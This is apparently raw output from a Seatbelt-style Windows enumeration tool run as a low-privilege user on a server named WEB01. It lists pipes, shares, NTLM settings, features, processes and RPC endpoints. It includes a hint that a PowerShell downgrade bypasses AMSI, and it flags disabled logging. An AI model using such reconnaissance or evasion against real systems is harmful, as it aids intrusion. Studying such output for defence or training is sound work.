   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== MicrosoftUpdates ======

Enumerating *all* Microsoft updates

ERROR:   [!] Terminating exception running command 'MicrosoftUpdates': System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: Exception from HRESULT: 0x80240007
   --- End of inner exception stack trace ---
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
   at AnschnallGurt.Commands.Windows.MicrosoftUpdateCommand.<Execute>d__9.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== MTPuTTY ======

====== NamedPipes ======


atsvc
    Server Process Id   : 1832
    Server Session Id   : 0

browser
    Server Process Id   : 3984
    Server Session Id   : 0

Ctx_WinStation_API_service
    Server Process Id   : 796
    Server Session Id   : 0

epmapper
    Server Process Id   : 1008
    Server Session Id   : 0

eventlog
    Server Process Id   : 1320
    Server Session Id   : 0

IISFCGI-bdc241c7-4e41-4689-93e1-992d31bb6369

iisipm8e1c63cf-d503-4a41-ac7c-88059706d631

iislogpipe2d825ba2-07ca-44b4-8376-69830e34e296

InitShutdown
    Server Process Id   : 576
    Server Session Id   : 0

lsass
    Server Process Id   : 736
    Server Session Id   : 0

LSM_API_service
    Server Process Id   : 84
    Server Session Id   : 0

MsFteWds
    Server Process Id   : 7588
    Server Session Id   : 0

ntsvcs
    Server Process Id   : 716
    Server Session Id   : 0

PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER

ProtectedPrefix\LocalService\FTHPIPE
    Server Process Id   : 3104
    Server Session Id   : 0

PSHost.134187979935781616.6816.DefaultAppDomain.explorer
    Server Process Id   : 6816
    Server Session Id   : 1
    Server Process Name : explorer
    Server Process Path : C:\WINDOWS\Explorer.EXE

PSHost.134188384768674278.7264.DefaultAppDomain.powershell
    Server Process Id   : 7264
    Server Session Id   : 0
    Server Process Name : powershell
    Server Process Path : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

PSHost.134188385564671025.5288.DefaultAppDomain.powershell
    Server Process Id   : 5288
    Server Session Id   : 0
    Server Process Name : powershell
    Server Process Path : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

PSHost.134188386090770098.5008.DefaultAppDomain.powershell
    Server Process Id   : 5008
    Server Session Id   : 0
    Server Process Name : powershell
    Server Process Path : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

PSHost.134188492206904054.1768.DefaultAppDomain.powershell
    Server Process Id   : 1768
    Server Session Id   : 1
    Server Process Name : powershell
    Server Process Path : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ROUTER
    Server Process Id   : 4864
    Server Session Id   : 0

scerpc
    Server Process Id   : 716
    Server Session Id   : 0

SearchTextHarvester
    Server Process Id   : 7588
    Server Session Id   : 0

SessEnvPublicRpc
    Server Process Id   : 3316
    Server Session Id   : 0

sql\query
    Server Process Id   : 4328
    Server Session Id   : 0

SQLLocal\MSSQLSERVER
    Server Process Id   : 4328
    Server Session Id   : 0

srvsvc
    Server Process Id   : 3348
    Server Session Id   : 0

tapsrv
    Server Process Id   : 2576
    Server Session Id   : 0

TermSrv_API_service
    Server Process Id   : 796
    Server Session Id   : 0

trkwks
    Server Process Id   : 2676
    Server Session Id   : 0

vgauth-service
    Server Process Id   : 2632
    Server Session Id   : 0

W32TIME_ALT
    Server Process Id   : 1136
    Server Session Id   : 0

Winsock2\CatalogChangeListener-240-0

Winsock2\CatalogChangeListener-2cc-0

Winsock2\CatalogChangeListener-2e0-0

Winsock2\CatalogChangeListener-3f0-0

Winsock2\CatalogChangeListener-528-0

Winsock2\CatalogChangeListener-728-0

Winsock2\CatalogChangeListener-a10-0

Winsock2\CatalogChangeListener-cf4-0

wkssvc
    Server Process Id   : 2164
    Server Session Id   : 0
====== NetworkProfiles ======

ERROR: Unable to collect. Must be an administrator.
====== NetworkShares ======

  Name                           : ADMIN$
  Path                           : C:\WINDOWS
  Description                    : Remote Admin
  Type                           : Disk Drive Admin

  Name                           : C$
  Path                           : C:\
  Description                    : Default share
  Type                           : Disk Drive Admin

  Name                           : IPC$
  Path                           :
  Description                    : Remote IPC
  Type                           : IPC Admin

====== NTLMSettings ======

  LanmanCompatibilityLevel    : (Send NTLMv2 response only - Win7+ default)

  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : 1 (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require128BitKey)
      NTLMMinServerSec        : 536870912 (Require128BitKey)


  NTLM Auditing and Restrictions
      InboundRestrictions     : (Not defined)
      OutboundRestrictions    : (Not defined)
      InboundAuditing         : (Not defined)
      OutboundExceptions      :
====== OfficeMRUs ======

Enumerating Office most recently used files for the last 7 days

  App       User                     LastAccess    FileName
  ---       ----                     ----------    --------
====== OneNote ======


    OneNote files (Administrator):



    OneNote files (Administrator.DAEDALUS):



    OneNote files (billing_user):



    OneNote files (MSSQLSERVER):



    OneNote files (SQLSERVERAGENT):



    OneNote files (SQLTELEMETRY):



    OneNote files (svc_backup):



    OneNote files (svc_dev):


====== OptionalFeatures ======

State    Name                                               Caption
Enabled  FileAndStorage-Services
Enabled  IIS-ApplicationDevelopment                         Application Development Features
Enabled  IIS-CGI                                            CGI
Enabled  IIS-CommonHttpFeatures                             Common HTTP Features
Enabled  IIS-DefaultDocument                                Default Document
Enabled  IIS-DirectoryBrowsing                              Directory Browsing
Enabled  IIS-HealthAndDiagnostics                           Health and Diagnostics
Enabled  IIS-HttpCompressionStatic                          Static Content Compression
Enabled  IIS-HttpErrors                                     HTTP Errors
Enabled  IIS-HttpLogging                                    HTTP Logging
Enabled  IIS-LoggingLibraries                               Logging Tools
Enabled  IIS-ManagementConsole                              IIS Management Console
Enabled  IIS-Performance                                    Performance Features
Enabled  IIS-RequestFiltering                               Request Filtering
Enabled  IIS-RequestMonitor                                 Request Monitor
Enabled  IIS-Security                                       Security
Enabled  IIS-StaticContent                                  Static Content
Enabled  IIS-WebServer                                      World Wide Web Services
Enabled  IIS-WebServerManagementTools                       Web Management Tools
Enabled  IIS-WebServerRole                                  Internet Information Services
Enabled  Internet-Explorer-Optional-amd64                   Internet Explorer 11
Enabled  KeyDistributionService-PSH-Cmdlets                 Key Distribution Service PowerShell Cmdlets
Enabled  MediaPlayback                                      Media Features
Enabled  MicrosoftWindowsPowerShell                         Windows PowerShell
Enabled  MicrosoftWindowsPowerShellISE                      Windows PowerShell Integrated Scripting Environment
Enabled  MicrosoftWindowsPowerShellRoot                     Windows PowerShell
Enabled  MicrosoftWindowsPowerShellV2                       Windows PowerShell 2.0 Engine
Enabled  NetFx4                                             .NET Framework 4.7
Enabled  NetFx4Extended-ASPNET45                            ASP.NET 4.7
Enabled  NetFx4ServerFeatures                               .NET Framework 4.7 Features
Enabled  Printing-Client                                    Windows Server Print Client
Enabled  Printing-Client-Gui                                Windows Server Print Client Management UI
Enabled  Printing-PrintToPDFServices-Features               Microsoft Print to PDF
Enabled  Printing-XPSServices-Features                      Microsoft XPS Document Writer
Enabled  RSAT                                               Root node for feature RSAT tools
Enabled  SearchEngine-Client-Package                        Windows Search
Enabled  Server-Core                                        Microsoft-Windows-Server-Core-Package-DisplayName
Enabled  ServerCore-Drivers-General                         Server Core Drivers
Enabled  ServerCore-Drivers-General-WOW64                   Server Core WOW64 Drivers
Enabled  ServerCoreFonts-NonCritical-Fonts-BitmapFonts      Server Core non-critical fonts - (Fonts-BitmapFonts).
Enabled  ServerCoreFonts-NonCritical-Fonts-MinConsoleFonts  Server Core non-critical fonts - (Fonts-MinConsoleFonts).
Enabled  ServerCoreFonts-NonCritical-Fonts-Support          Server Core non-critical fonts components - (Fonts-Support).
Enabled  ServerCoreFonts-NonCritical-Fonts-TrueType         Server Core non-critical fonts - (Font-TrueTypeFonts).
Enabled  ServerCoreFonts-NonCritical-Fonts-UAPFonts         Server Core non-critical fonts - (Fonts-UAPFonts).
Enabled  ServerCore-WOW64                                   Microsoft Windows ServerCore WOW64
Enabled  Server-Drivers-General                             Server Drivers
Enabled  Server-Drivers-Printers                            Server Printer Drivers
Enabled  Server-Gui-Mgmt                                    Microsoft-Windows-Server-Gui-Mgmt-Package-DisplayName
Enabled  Server-Psh-Cmdlets                                 Microsoft Windows ServerCore Foundational PowerShell Cmdlets
Enabled  Server-Shell                                       Microsoft-Windows-Server-Shell-Package-DisplayName
Enabled  SMB1Protocol                                       SMB 1.0/CIFS File Sharing Support
Enabled  SMB1Protocol-Client                                SMB 1.0/CIFS Client
Enabled  SMB1Protocol-Server                                SMB 1.0/CIFS Server
Enabled  SmbDirect                                          SMB Direct
Enabled  Storage-Services
Enabled  SystemDataArchiver                                 System Data Archiver
Enabled  TlsSessionTicketKey-PSH-Cmdlets                    TLS Session Ticket Key Commands
Enabled  Tpm-PSH-Cmdlets                                    Trusted Platform Module Service PowerShell Cmdlets
Enabled  WCF-Services45                                     WCF Services
Enabled  WCF-TCP-PortSharing45                              TCP Port Sharing
Enabled  Windows-Defender                                   Windows Defender Antivirus
Enabled  WindowsMediaPlayer                                 Windows Media Player
Enabled  WindowsServerBackupSnapin                          Windows Server Backup SnapIn
====== OracleSQLDeveloper ======

====== OSInfo ======

  Hostname                      :  WEB01
  Domain Name                   :  daedalus.local
  Username                      :  WEB01\svc_dev
  ProductName                   :  Windows Server 2019 Standard
  EditionID                     :  ServerStandard
  ReleaseId                     :  1809
  Build                         :  17763.6293
  BuildBranch                   :  rs5_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  ProcessorCount                :  8
  IsVirtualMachine              :  True
  BootTimeUtc (approx)          :  3/24/2026 3:52:00 AM (Total uptime: 00:14:15:19)
  HighIntegrity                 :  False
  IsLocalAdmin                  :  False
  CurrentTimeUtc                :  3/24/2026 6:07:19 PM (Local time: 3/24/2026 11:07:19 AM)
  TimeZone                      :  Pacific Standard Time
  TimeZoneOffset                :  -07:00:00
  InputLanguage                 :  US
  InstalledInputLanguages       :  US
  MachineGuid                   :  eb299db7-a1dc-47c1-a38b-55aee2a196d9
====== OutlookDownloads ======

====== PoweredOnEvents ======

Collecting kernel boot (EID 12) and shutdown (EID 13) events from the last 7 days

Powered On Events (Time is local time)

  3/23/2026 8:52:07 PM    :  startup
====== PowerShell ======


  Installed CLR Versions
      4.0.30319

  Installed PowerShell Versions
      2.0
        [!] Version 2.0.50727 of the CLR is not installed - PowerShell v2.0 won't be able to run.
      5.1.17763.1

  Transcription Logging Settings
      Enabled            : False
      Invocation Logging : False
      Log Directory      :

  Module Logging Settings
      Enabled             : False
      Logged Module Names :

  Script Block Logging Settings
      Enabled            : False
      Invocation Logging : False

  Anti-Malware Scan Interface (AMSI)
      OS Supports AMSI: True
        [!] You can do a PowerShell version downgrade to bypass AMSI.
====== PowerShellEvents ======

Searching script block logs (EID 4104) for sensitive data.

ERROR:   [!] Terminating exception running command 'PowerShellEvents': System.UnauthorizedAccessException: Attempted to perform an unauthorized operation.
   at System.Diagnostics.Eventing.Reader.EventLogException.Throw(Int32 errorCode)
   at System.Diagnostics.Eventing.Reader.NativeWrapper.EvtQuery(EventLogHandle session, String path, String query, Int32 flags)
   at System.Diagnostics.Eventing.Reader.EventLogReader..ctor(EventLogQuery eventQuery, EventBookmark bookmark)
   at AnschnallGurt.Runtime.GetEventLogReader(String path, String query)
   at AnschnallGurt.Commands.Windows.EventLogs.PowerShellEventsCommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== PowerShellHistory ======

====== Printers ======

ERROR:   [!] Terminating exception running command 'Printers': System.Management.ManagementException: Generic failure
   at System.Management.ManagementException.ThrowWithExtendedInfo(ManagementStatus errorCode)
   at System.Management.ManagementObjectCollection.ManagementObjectEnumerator.MoveNext()
   at AnschnallGurt.Commands.Windows.PrintersCommand.<Execute>d__9.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== ProcessCreationEvents ======

ERROR: Unable to collect. Must be an administrator.
====== Processes ======

Collecting Non Microsoft Processes (via WMI)

 ProcessName                              : vmtoolsd
 ProcessId                                : 7848
 ParentProcessId                          : 6816
 CompanyName                              : VMware, Inc.
 Description                              : VMware Tools Core Service
 Version                                  : 12.4.0.48309
 Path                                     : C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 CommandLine                              : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
 IsDotNet                                 : False
 ProcessProtectionInformation             :

 ProcessName                              : Synaptics
 ProcessId                                : 7232
 ParentProcessId                          : 6016
 CompanyName                              : Synaptics
 Description                              : Synaptics Pointing Device Driver
 Version                                  : 1.0.0.4
 Path                                     : C:\ProgramData\Synaptics\Synaptics.exe
 CommandLine                              : "C:\ProgramData\Synaptics\Synaptics.exe" InjUpdate
 IsDotNet                                 : False
 ProcessProtectionInformation             :

====== ProcessOwners ======

 sihost.exe                                         6232       WEB01\svc_dev
 svchost.exe                                        6264       WEB01\svc_dev
 svchost.exe                                        6288       WEB01\svc_dev
 taskhostw.exe                                      6320       WEB01\svc_dev
 ctfmon.exe                                         6512       WEB01\svc_dev
 explorer.exe                                       6816       WEB01\svc_dev
 ShellExperienceHost.exe                            7068       WEB01\svc_dev
 SearchUI.exe                                       7164       WEB01\svc_dev
 RuntimeBroker.exe                                  2072       WEB01\svc_dev
 RuntimeBroker.exe                                  7520       WEB01\svc_dev
 vmtoolsd.exe                                       7848       WEB01\svc_dev
 conhost.exe                                        4812       WEB01\svc_dev
 powershell.exe                                     1768       WEB01\svc_dev
====== PSSessionSettings ======

ERROR: Unable to collect. Must be an administrator.
====== PuttyHostKeys ======

====== PuttySessions ======

====== RDCManFiles ======

====== RDPSavedConnections ======

====== RDPSessions ======

  SessionID                     :  0
  SessionName                   :  Services
  UserName                      :  \
  State                         :  Disconnected
  HostName                      :
  FarmName                      :
  LastInput                     :  18h:07m:20s:592ms
  ClientIP                      :
  ClientHostname                :
  ClientResolution              :
  ClientBuild                   :  0
  ClientHardwareId              :  0,0,0,0
  ClientDirectory               :

  SessionID                     :  1
  SessionName                   :  Console
  UserName                      :  WEB01\svc_dev
  State                         :  Active
  HostName                      :
  FarmName                      :
  LastInput                     :  18h:07m:20s:608ms
  ClientIP                      :
  ClientHostname                :
  ClientResolution              :  640x480 @ 2 bits per pixel
  ClientBuild                   :  0
  ClientHardwareId              :  0,0,0,0
  ClientDirectory               :

====== RDPsettings ======

RDP Server Settings:
  NetworkLevelAuthentication:
  BlockClipboardRedirection:
  BlockComPortRedirection:
  BlockDriveRedirection:
  BlockLptPortRedirection:
  BlockPnPDeviceRedirection:
  BlockPrinterRedirection:
  AllowSmartCardRedirection:

RDP Client Settings:
  DisablePasswordSaving: True
  RestrictedRemoteAdministration: False
====== RecycleBin ======

Recycle Bin Files Within the last 30 Days

====== reg ======

HKLM\Software ! (default) :
HKLM\Software\Classes ! (default) :
HKLM\Software\Clients ! (default) :
HKLM\Software\DefaultUserEnvironment ! (default) :
HKLM\Software\dotnet ! (default) :
HKLM\Software\Google ! (default) :
HKLM\Software\Intel ! (default) :
HKLM\Software\Microsoft ! (default) :
HKLM\Software\Mozilla ! (default) :
HKLM\Software\ODBC ! (default) :
HKLM\Software\OpenSSH ! (default) :
HKLM\Software\Partner ! (default) :
HKLM\Software\Policies ! (default) :
HKLM\Software\RegisteredApplications ! (default) :
HKLM\Software\Setup ! (default) :
HKLM\Software\VMware, Inc. ! (default) :
HKLM\Software\WOW6432Node ! (default) :
====== RPCMappedEndpoints ======

  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncacn_ip_tcp:[49664]
  64d1d045-f675-460b-8a94-570246b36dab v1.0 (CLIPSVC Default RPC Interface): ncalrpc:[ClipServiceTransportEndpoint-00001]
  cc105610-da03-467e-bc73-5b9e2937458d v1.0 (LiveIdSvc RPC Interface): ncalrpc:[LRPC-2e8421c2d317ce9906]
  faf2447b-b348-4feb-8dbe-beee5b7f7778 v1.0 (OnlineProviderCert RPC Interface): ncalrpc:[LRPC-2e8421c2d317ce9906]
  572e35b4-1344-4565-96a1-f5df3bfa89bb v1.0 (LiveIdSvcNotify RPC Interface): ncalrpc:[liveidsvcnotify]
  0497b57d-2e66-424f-a0c6-157cd5d41700 v1.0 (AppInfo): ncalrpc:[LRPC-9d5a340abda7c546c3]
  201ef99a-7fa0-444c-9399-19ba84f12a1a v1.0 (AppInfo): ncalrpc:[LRPC-9d5a340abda7c546c3]
  5f54ce7d-5b79-4175-8584-cb65313a0e98 v1.0 (AppInfo): ncalrpc:[LRPC-9d5a340abda7c546c3]
  fd7a0523-dc70-43dd-9b2e-9c5ed48225b1 v1.0 (AppInfo): ncalrpc:[LRPC-9d5a340abda7c546c3]
  58e604e8-9adb-4d2e-a464-3b0683fb1480 v1.0 (AppInfo): ncalrpc:[LRPC-9d5a340abda7c546c3]
  0767a036-0d22-48aa-ba69-b619480f38cb v1.0 (PcaSvc): ncalrpc:[LRPC-84c57d3250a10121cf]
  be7f785e-0e3a-4ab7-91de-7e46e443be29 v0.0 (): ncalrpc:[LRPC-d2e84234ecb17e9bfe]
  54b4c689-969a-476f-8dc2-990885e9f562 v0.0 (): ncalrpc:[LRPC-d2e84234ecb17e9bfe]
  bf4dc912-e52f-4904-8ebe-9317c1bdd497 v1.0 (): ncalrpc:[OLE7F1AF5383646BA8F0988E73D47D3]
  bf4dc912-e52f-4904-8ebe-9317c1bdd497 v1.0 (): ncalrpc:[LRPC-f2270e037c72278aa3]
  a4b8d482-80ce-40d6-934d-b22a01a44fe7 v1.0 (LicenseManager): ncalrpc:[LicenseServiceEndpoint]
  8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 (): ncalrpc:[OLE2BA9286D528550339FC28A20FAEE]
  8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 (): ncalrpc:[LRPC-3472ecdc428f3a6693]
  0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 (): ncalrpc:[OLE2BA9286D528550339FC28A20FAEE]
  0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 (): ncalrpc:[LRPC-3472ecdc428f3a6693]
  b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 (): ncalrpc:[OLE2BA9286D528550339FC28A20FAEE]
  b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 (): ncalrpc:[LRPC-3472ecdc428f3a6693]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WMsgKRpc0B1AE1]
  12e65dd8-887f-41ef-91bf-8d816c42c2e7 v1.0 (Secure Desktop LRPC interface): ncalrpc:[WMsgKRpc0B1AE1]
  367abb81-9844-35f1-ad32-98f038001003 v2.0 (): ncacn_ip_tcp:[49713]
  4c9dbf19-d39e-4bb9-90ee-8f7179b20283 v1.0 (): ncalrpc:[LRPC-ba7ce48e77f518a7d7]
  fd8be72b-a9cd-4b2c-a9ca-4ded242fbe4d v1.0 (): ncalrpc:[LRPC-ba7ce48e77f518a7d7]
  95095ec8-32ea-4eb0-a3e2-041f97b36168 v1.0 (): ncalrpc:[LRPC-ba7ce48e77f518a7d7]
  e38f5360-8572-473e-b696-1b46873beeab v1.0 (): ncalrpc:[LRPC-ba7ce48e77f518a7d7]
  d22895ef-aff4-42c5-a5b2-b14466d34ab4 v1.0 (): ncalrpc:[LRPC-ba7ce48e77f518a7d7]
  98cd761e-e77d-41c8-a3c0-0fb756d90ec2 v1.0 (): ncalrpc:[LRPC-ba7ce48e77f518a7d7]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncacn_np:[\\PIPE\\ROUTER]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncalrpc:[RasmanLrpc]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncalrpc:[VpnikeRpc]
  650a7e26-eab8-5533-ce43-9c1dfce11511 v1.0 (Vpn APIs): ncalrpc:[LRPC-00554c760bc4b877ba]
  2f5f6521-cb55-1059-b446-00df0bce31db v1.0 (Unimodem LRPC Endpoint): ncacn_np:[\\pipe\\tapsrv]
  2f5f6521-cb55-1059-b446-00df0bce31db v1.0 (Unimodem LRPC Endpoint): ncalrpc:[tapsrvlpc]
  2f5f6521-cb55-1059-b446-00df0bce31db v1.0 (Unimodem LRPC Endpoint): ncalrpc:[unimdmsvc]
  b18fbab6-56f8-4702-84e0-41053293a869 v1.0 (UserMgrCli): ncalrpc:[OLE2D41034F0E900619C994E8A535BC]
  b18fbab6-56f8-4702-84e0-41053293a869 v1.0 (UserMgrCli): ncalrpc:[LRPC-2162a53e6b394bd20c]
  0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 (UserMgrCli): ncalrpc:[OLE2D41034F0E900619C994E8A535BC]
  0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 (UserMgrCli): ncalrpc:[LRPC-2162a53e6b394bd20c]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-3203df20e0a5a50cd4]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-3203df20e0a5a50cd4]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-3203df20e0a5a50cd4]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[OLE4982F1D78F5C1D52D43CCD16ABF1]
  906b0ce0-c70b-1067-b317-00dd010662da v1.0 (): ncalrpc:[LRPC-3e727111ad0aec0d0c]
  4b112204-0e19-11d3-b42b-0000f81feb9f v1.0 (): ncalrpc:[LRPC-7193eecd165f1b5f6d]
  98716d03-89ac-44c7-bb8c-285824e51c4a v1.0 (XactSrv service): ncalrpc:[LRPC-d9293d5a54719eb925]
  1a0d010f-1c33-432c-b0f5-8cf4e8053099 v1.0 (IdSegSrv service): ncalrpc:[LRPC-d9293d5a54719eb925]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-99b9549307f8fb9fc1]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncalrpc:[LRPC-99b9549307f8fb9fc1]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncalrpc:[SessEnvPrivateRpc]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncacn_np:[\\pipe\\SessEnvPublicRpc]
  29770a8f-829b-4158-90a2-78cd488501f7 v1.0 (): ncacn_ip_tcp:[49668]
  30b044a5-a225-43f0-b3a4-e060df91f9c1 v1.0 (): ncalrpc:[LRPC-805e2c97d53567f53d]
  a398e520-d59a-4bdd-aa7a-3c1e0303a511 v1.0 (IKE/Authip API): ncalrpc:[LRPC-ec13fb86191e78b2d6]
  b58aa02e-2884-4e97-8176-4ee06d794184 v1.0 (): ncalrpc:[LRPC-4a7118fb23d1078518]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncacn_np:[\\pipe\\lsass]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[audit]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[securityevent]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSARPC_ENDPOINT]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsacap]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[LSA_EAS_ENDPOINT]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsapolicylookup]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[lsasspirpc]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[protected_storage]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[SidKey Local End Point]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[samss lpc]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 (KeyIso): ncalrpc:[NETLOGON_LRPC]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncacn_np:[\\pipe\\lsass]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[audit]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[securityevent]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSARPC_ENDPOINT]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsacap]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_EAS_ENDPOINT]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsapolicylookup]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[lsasspirpc]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[protected_storage]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[SidKey Local End Point]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[samss lpc]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 (Ngc Pop Key Service): ncalrpc:[NETLOGON_LRPC]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncacn_np:[\\pipe\\lsass]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[audit]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[securityevent]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSARPC_ENDPOINT]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsacap]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_EAS_ENDPOINT]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsapolicylookup]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsasspirpc]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[protected_storage]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[SidKey Local End Point]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[samss lpc]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[NETLOGON_LRPC]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncacn_np:[\\pipe\\lsass]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[audit]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[securityevent]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSARPC_ENDPOINT]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[lsacap]
  0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 v0.0 (RemoteAccessCheck): ncalrpc:[LSA_IDPEXT_ENDPOINT]
